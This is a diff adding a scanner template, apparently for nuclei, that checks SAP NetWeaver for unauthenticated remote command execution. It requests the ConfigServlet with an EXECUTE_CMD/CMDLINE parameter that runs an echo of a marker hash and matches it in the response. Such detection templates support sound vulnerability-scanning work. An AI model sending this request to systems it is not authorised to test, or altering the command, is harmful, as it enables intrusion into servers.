@@ -1,0 +1,20 @@
+id: SAP-NetWeaver-rce
+info:
+  author: Str1am
+  name: "Sap Netweaver\u547D\u4EE4\u6267\u884C"
+  severity: high
+  tags: NetWeaver,rce
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - 21232f297a57a5a743894a0e4a801fc3
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=echo%2021232f297a57a5a743894a0e4a801fc3'
